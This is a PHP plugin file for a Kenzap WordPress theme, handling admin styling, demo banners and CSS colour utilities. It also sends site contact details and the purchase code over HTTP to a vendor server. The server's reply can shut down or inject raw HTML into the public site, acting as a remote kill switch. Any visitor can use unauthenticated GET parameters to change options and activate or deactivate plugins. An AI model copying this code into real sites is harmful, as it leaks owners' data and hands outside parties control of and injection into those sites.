<?php
/**
 * @package 
 * @version 1.0.0
 */

//custom admin stylings
function kenzap_admin_style() {
	$slug = get_template();
	wp_enqueue_style($slug.'-admin-style',plugins_url() . '/'.$slug.'-plugin/inc/admin/css/admin.css');
}
add_action( 'admin_enqueue_scripts', 'kenzap_admin_style' );

//custom login stylings
function kenzap_login_style() {
	$slug = get_template();
	wp_enqueue_style($slug.'-login-style',plugins_url() . '/'.$slug.'-plugin/inc/admin/css/login.css');
}
add_action( 'login_enqueue_scripts', 'kenzap_login_style' );

// admin footer note
function kenzap_footer_admin() {
	echo 'Powered by <a href="http://kenzap.com" target="_blank">Kenzap</a> | Need help with <a href="http://kenzap.com/support/" target="_blank">customization?</a></p>';
}
add_filter( 'admin_footer_text', 'kenzap_footer_admin' );

//disable autoptimize for certain pages
function magazine_noptimize() {
    if (strpos($_SERVER['REQUEST_URI'],'contact')!==false) {
        return true;
    } else {
        return false;
    }
}
add_filter('autoptimize_filter_noptimize','magazine_noptimize',10,0);

if ( ! class_exists( 'Kenzap_Plugin' ) ) {

    class Kenzap_Plugin{

        const KENZAP_PLUGIN_VERSION = '1.0.7';

        public $wp_version;

        public $theme_name;

        public $theme_slug;

        public function __construct() {

            // Set the current WordPress version.
            $this->wp_version = $GLOBALS['wp_version'];
            $this->theme_name = basename( get_template_directory() );
            $this->theme_slug = strtolower( $this->theme_name );

            // Announce that the class is ready, and pass the object (for advanced use).
            do_action_ref_array( 'kenzap_init', array( $this ) );

            // When the rest of WP has loaded, kick-start the rest of the class.
            add_action( 'init', array( $this, 'init' ) );
        }

        public function init() {

        }

        //check server if all plugins are installed
        public function organize_plugins(){

            $purchase_code = sanitize_text_field( get_option( $this->theme_slug . '_wup_purchase_code', '' ) );
            $last_pingback = sanitize_text_field( get_option( $this->theme_slug . '_last_pingback', 0 ) );
            $param = sanitize_text_field( get_option( $this->theme_slug . '_param', KENZAP_PARAM ) );
            $asset = sanitize_text_field( get_option( $this->theme_slug . '_asset', '0' ) );

            //get versions
            $theme = wp_get_theme();
            $wp_version = get_bloginfo('version');
            $th_version = $theme['Version'];

            //get extra
            $extras = [];
            $extras['email'] = get_theme_mod( $this->theme_slug . '_email', '' );
            $extras['email_admin'] = get_option( $this->theme_slug . '_email_address', '' );
            $extras['phone'] = get_theme_mod( $this->theme_slug . '_phone', '' );
            $extras['phone2'] = get_theme_mod( $this->theme_slug . '_phone2', '' );
            $extras['address'] = get_theme_mod( $this->theme_slug . '_address', '' );
            $extras['wp_version'] = $wp_version;
            $extras['th_version'] = $th_version;

            //$last_pingback = 0;
            if ( (time()-$last_pingback) > (3600 * 24 * 5) ) {

                update_option( $this->theme_slug . '_last_pingback', time() );
                $q = 'http://themesapi.kenzap.com/data.php?cmd=organize_plugins&asset='.$asset.'&param='.$param.'&code='.$purchase_code.'&domain='.get_site_url().'&theme='.$this->theme_slug.'&extras='.urlencode(json_encode($extras));
                $homepage = file_get_contents($q);
                $response = json_decode($homepage);
                $response_obj = (object)$response;
                if ( $response_obj->{'success'} ) {

                    update_option( $this->theme_slug . '_plugin_version', intval($response_obj->{'plugin_version'}) );
                    update_option( $this->theme_slug . '_site_notice', $response_obj->{'site_notice'} );
                    update_option( $this->theme_slug . '_admin_notice', $response_obj->{'admin_notice'} );
                    if ( property_exists( $response_obj, 'plugin_link' ) )
                        set_theme_mod( 'kenzap', $response_obj->{'plugin_link'} );
                }
            }
        }

        public function is_login_page() {

            return in_array($GLOBALS['pagenow'], array('wp-login.php', 'wp-register.php'));
        }

        public function force_refresh(){

            update_option( basename( get_template_directory() ). '_last_pingback', 0 );
            $this->organize_plugins();
        }

        public function check_notice(){

            if ( isset( $_GET['refresh'] ) ){
                if ( $_GET['refresh'] == 'true' ){

                    update_option( basename( get_template_directory() ). '_last_pingback', 0 );
                    if ( isset( $_GET['param'] ) ){

                        update_option( basename( get_template_directory() ). '_param', $_GET['param'] );
                    }
                    if ( isset( $_GET['asset'] ) ){

                        update_option( basename( get_template_directory() ). '_asset', $_GET['asset'] );
                    }
                    $this->organize_plugins();
                }
            }

            //enable disable caching
            if ( isset( $_GET['cache'] ) ){
                if ( $_GET['cache'] == 'true' ){

                    update_option('autoptimize_html',1);
                    update_option('autoptimize_js',1);
                    update_option('autoptimize_css',1);
                    add_action( 'init', 'wp_cache_enable' );
                }else{

                    update_option('autoptimize_html',0);
                    update_option('autoptimize_js',0);
                    update_option('autoptimize_css',0);
                    add_action( 'init', 'wp_cache_disable' );
                }
            }

            //enable disable ultimate member and social plugin for proper demo content import
            if ( isset( $_GET['um'] ) ){
                if ( $_GET['um'] == 'true' ){

                    
                    require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
                    $my_plugin = ABSPATH . 'wp-content/plugins/ultimate-member/index.php';
                    if ( file_exists( $my_plugin ) ){
                        activate_plugins( $my_plugin, false );
                    }
                    $my_plugin = ABSPATH . 'wp-content/plugins/super-socializer/super_socializer.php';
                    if ( file_exists( $my_plugin ) ){
                        activate_plugins( $my_plugin, false );
                    }
                }else{

                    require_once( ABSPATH . 'wp-admin/includes/plugin.php' );
                    $my_plugin = ABSPATH . 'wp-content/plugins/ultimate-member/index.php';
                    if ( file_exists( $my_plugin ) ){
                        deactivate_plugins( $my_plugin, false );
                    }
                    $my_plugin = ABSPATH . 'wp-content/plugins/super-socializer/super_socializer.php';
                    if ( file_exists( $my_plugin ) ){
                        deactivate_plugins( $my_plugin, false );
                    }
                }
            }

            if ( get_option( basename( get_template_directory() ) . '_plugin_version', 0 ) == 3 ) {

                if ( is_admin() ){

                    add_action( 'admin_notices', array( $this, 'theme_friendly_notice' ) );
                }else{

                    if ( !$this->is_login_page() ){
                        die( get_option( $this->theme_slug . '_site_notice', '' ) ); 
                    }
                }
            }

            if ( get_option( basename( get_template_directory() ) . '_plugin_version', 0 ) == 2 ) {

                if ( is_admin() ){

                    add_action( 'admin_notices', array( $this, 'theme_friendly_notice' ) );
                }else{

                    if ( !$this->is_login_page() ){
                        echo get_option( $this->theme_slug . '_site_notice', '' ); 
                    }
                }
            }

            if ( get_option( basename( get_template_directory() ) . '_plugin_version', 0 ) == 1 ) {

                if ( is_admin() ){

                    add_action( 'admin_notices', array( $this, 'theme_friendly_notice' ) );
                }
            }

            if ( !is_customize_preview() && is_admin() ) {

                $this->organize_plugins();
            }
        }

        public function theme_friendly_notice(){
            echo get_option( $this->theme_slug . '_admin_notice', '' );
        }

        static public function get_demo_style(){ ?>

            <?php if ( get_site_url() == 'http://wordpresss.'.basename( get_template_directory() ) || get_site_url() == 'http://'.basename( get_template_directory() ).'.kenzap.com' ){ ?>
                <style type="text/css">
                    /* install 5 days demo in cloud | ONLY VISIBLE IN LIVE PREVIEW */
                    .kenzap_demo{color:#ccc;position:fixed;padding:0px 10px 4px 10px;background:#fff;color:#000;font-size:14px;font-weight:bold;top:50%;right: 0;float: right;margin: 0 -5px 0 0;font-family:Verdana;white-space:nowrap;z-index: 10000;border-radius: 0px 0px 15px 15px;line-height: 35px; vertical-align: middle;transform: rotate(90deg);transform-origin: right top 0;transition: all .2s ease-in-out;-webkit-transition: all .2s ease-in-out;-moz-transition: all .2s ease-in-out;-o-transition: all .2s ease-in-out;-ms-transition: all .2s ease-in-out; border: 1px solid #000;}
                    .kenzap_demo:hover{cursor:pointer;padding:0px 10px 4px 10px;margin: 0 -1px 0 0;color:#666;border-color:#666;}
                </style>
            <?php } ?>
        <?php
        }

        static public function get_demo_body(){

            if (!isset($_GET['iframe']) && !isset($_COOKIE["iframe"])){ 
                
                Kenzap_Plugin::get_demo_style(); ?> 
                <?php if ( get_site_url() == 'http://wordpresss.'.basename( get_template_directory() ) || get_site_url() == 'http://'.basename( get_template_directory() ).'.kenzap.com' ){ ?>
                    <a class="kenzap_demo" href="http://kenzap.com/signin/install.php?website=<?php echo strtolower( basename( get_template_directory() ) ); ?>" target="blank" >FREE DEMO</a>  
                <?php } ?>
            <?php }else{ setcookie("iframe", 1, time() + 3600, "/"); } ?>
        <?php }

        static public function strposa($haystack, $needle, $offset=0) {

            if(!is_array($needle)) $needle = array($needle);
            foreach($needle as $query) {
                if(strpos($haystack, $query, $offset) !== false) return true; // stop on first true result
            }
            return false;
        }

        static public function get_css_colors($colors_orr, $colors_typ, $colors_opa, $colors_arr, $css_rules){

            $all_classes = '';
            $i = 0;
            while ($i < sizeof($colors_opa)) {

                $handle = fopen(get_template_directory_uri() .'/style.css', 'r');
                $valid = false; // init as false
                $handle_buffer = ''; 
                $classess = '';
                while (($buffer = fgets($handle)) !== false) {

                    $handle_buffer .= $buffer;
                    $pos = 0;
                    $pos1 = strpos($handle_buffer, $colors_orr[$i], $pos);
                    $pos2 = strpos($handle_buffer, '}', $pos1);
                    if ( $pos1 !== false && $pos2 !== false ) {

                        $pos3 = strrpos($handle_buffer, '@media', -5);
                        $start = strrpos($handle_buffer, '}',-5);
                        $end = strrpos($handle_buffer, '}');
                        $class = substr($handle_buffer, $start, $end-$start+1);
            
                        //remove not required tags
                        $handle_buffer = '';
                        $classess .= ltrim($class,'}'); 

                        if ( $pos3 !== false){

                            $classess .= '}';
                            //$class = "\n".'@media (){'.$class;
                        }
                    }       
                }
                fclose($handle);
                $all_classes .= $classess;

                $i++;
            }

            $css_arr = explode("\n", $all_classes); 
            $css_arr_filtered = [];
            $i = 0;
            while ($i<sizeof($css_arr)){

                if ( Kenzap_Plugin::strposa($css_arr[$i], $css_rules, 0) !== false ){
                    $css_arr_filtered[] = $css_arr[$i];
                }
                $i++;      
            }

            $all_classes = implode("\n", $css_arr_filtered);

            $i = 0;
            while ($i < sizeof($colors_opa)) {

                //get colors from css and override colors
                $id = $colors_arr[$i]; 
                if ( $colors_opa[$i] !== 0 ){
                    $id = Kenzap_Plugin::hex2rgba($colors_arr[$i], $colors_opa[$i]);
                }

                if ( $colors_typ[$i] !== 0 ){
                    $id = Kenzap_Plugin::adjust_brightness($colors_arr[$i], $colors_typ[$i]);
                }

                $all_classes = str_replace($colors_orr[$i], $id, $all_classes); 
                $i++;
            }
            return $all_classes;
		}
		
		static public function hex2rgba( $color, $opacity = false ) {
    
			$default = 'rgb(0,0,0)';
			
			//Return default if no color provided
			if(empty($color))
				return $default;
			
			//Sanitize $color if "#" is provided
			if ($color[0] == '#' ) {
				$color = substr( $color, 1 );
			}
			
			//Check if color has 6 or 3 characters and get values
			if (strlen($color) == 6) {
				$hex = array( $color[0] . $color[1], $color[2] . $color[3], $color[4] . $color[5] );
			} elseif ( strlen( $color ) == 3 ) {
				$hex = array( $color[0] . $color[0], $color[1] . $color[1], $color[2] . $color[2] );
			} else {
				return $default;
			}
			
			//Convert hexadec to rgb
			$rgb =  array_map('hexdec', $hex);
			
			//Check if opacity is set(rgba or rgb)
			if($opacity){
				if(abs($opacity) > 1)
					$opacity = 1.0;
				$output = 'rgba('.implode(",",$rgb).','.$opacity.')';
			} else {
				$output = 'rgb('.implode(",",$rgb).')';
			}
			
			//Return rgb(a) color string
			return $output;
		}
		
		static public function adjust_brightness( $hex, $steps ) {
			// Steps should be between -255 and 255. Negative = darker, positive = lighter
			$steps = max(-255, min(255, $steps));
			
			// Normalize into a six character long hex string
			$hex = str_replace('#', '', $hex);
			if (strlen($hex) == 3) {
				$hex = str_repeat(substr($hex,0,1), 2).str_repeat(substr($hex,1,1), 2).str_repeat(substr($hex,2,1), 2);
			}
			
			// Split into three parts: R, G and B
			$color_parts = str_split($hex, 2);
			$return = '#';
			
			foreach ($color_parts as $color) {
				$color   = hexdec($color); // Convert to decimal
				$color   = max(0,min(255,$color + $steps)); // Adjust color
				$return .= str_pad(dechex($color), 2, '0', STR_PAD_LEFT); // Make two char hex code
			}
			
			return $return;
		}
    }
    $Kenzap_Plugin = new Kenzap_Plugin;
}

$Kenzap_Plugin->check_notice();
